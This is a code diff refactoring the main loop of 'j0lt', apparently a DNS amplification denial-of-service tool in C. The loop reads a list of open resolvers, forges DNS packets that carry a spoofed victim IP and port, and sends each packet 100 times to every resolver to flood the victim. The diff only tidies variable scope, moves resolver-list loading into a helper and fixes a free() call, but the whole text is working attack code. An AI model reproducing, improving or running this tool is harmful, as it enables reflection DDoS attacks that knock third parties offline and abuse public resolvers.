@@ -156,7 +156,7 @@ DEFINE_INSERT_FN(qword, uint64_t)
 #define PEWPEW_J0LT 100  // value for the tmc effect.
 #define MAX_LINE_SZ_J0LT 0x30
 
-GLOBAL_STRING_TYPE GLOBAL_STRING_RESOLV_LIST_SAVE_NAME = "logs/j0lt-resolv.txt";
+
 GLOBAL_STRING_TYPE GLOBAL_STRING_MENU = {
     " =========================================================\n"
     " Usage: sudo ./j0lt -t -p -n [OPTION]...                  \n"
@@ -183,35 +183,18 @@ bool send_payload(const uint8_t *datagram, uint32_t daddr, uint16_t uh_dport,
                   size_t nwritten);
 
 int main(int argc, char **argv) {
-  int i, nread;
-  size_t szpayload, szpewpew;
-
   printf("%s", GLOBAL_STRING_MENU);
 
   JoltOptions opts;
-
-  init_opts(&opts);
-
-  CHECK_SUCCESS(parse_opts(&opts, argc, (const char **)argv),
-                "* parse_opts error");
-  char *savepath = NULL;
-  CHECK_SUCCESS(wget_resolvlist_and_save_path(
-                    GLOBAL_STRING_RESOLV_LIST_SAVE_NAME, &savepath),
-                "* wget error");
-
-  printf("+ resolv list saved to %s\n", savepath);
+  CHECK_SUCCESS(parse_opts(&opts, argc, (const char **)argv), "* parse_opts error");
 
   void *resolvlist_buffer = NULL;
   size_t szresolvlist = 0;
-  if (read_file_into_mem(savepath, &resolvlist_buffer, &szresolvlist) == false) {
-    err_exit("* file read error");
-    free(savepath);
-  }
-  free(savepath);
+  CHECK_SUCCESS(get_resolver_list(&resolvlist_buffer, &szresolvlist), "* get_resolver_list error");
 
   char payload[NS_PACKETSZ], lineptr[MAX_LINE_SZ_J0LT];
   while (opts.nthreads >= 1) {
-    nread = 0;
+    int nread = 0;
     char *resolvptr = (char *)resolvlist_buffer;
     if (opts.debug_mode == true)
       printf("+ current attack nthreads %d \n", opts.nthreads);
@@ -219,16 +202,17 @@ int main(int argc, char **argv) {
                              szresolvlist)) != 0) {
       resolvptr += nread;
       szresolvlist -= nread;
+      int i;
       for (i = 0; isdigit(lineptr[i]); i++);
       if (lineptr[i] != '.')  // check ip4
         continue;
 
       in_addr_t resolvip = inet_addr(lineptr);
       if (resolvip == 0) continue;
-      szpayload = forge_j0lt_packet(payload, htonl(resolvip),
+      size_t szpayload = forge_j0lt_packet(payload, htonl(resolvip),
                                     htonl(opts.spoof_ip), opts.spoof_port);
       if (opts.debug_mode == 0) {
-        szpewpew = PEWPEW_J0LT;
+        size_t szpewpew = PEWPEW_J0LT;
         while (szpewpew-- > 0)
           send_payload((uint8_t *)payload, resolvip, htons(NS_DEFAULTPORT),
                        szpayload);
@@ -237,8 +221,8 @@ int main(int argc, char **argv) {
     }
     opts.nthreads--;
   }
+  free(resolvlist_buffer);
 
-  free(resolvlist);
   return 0;
 }
 
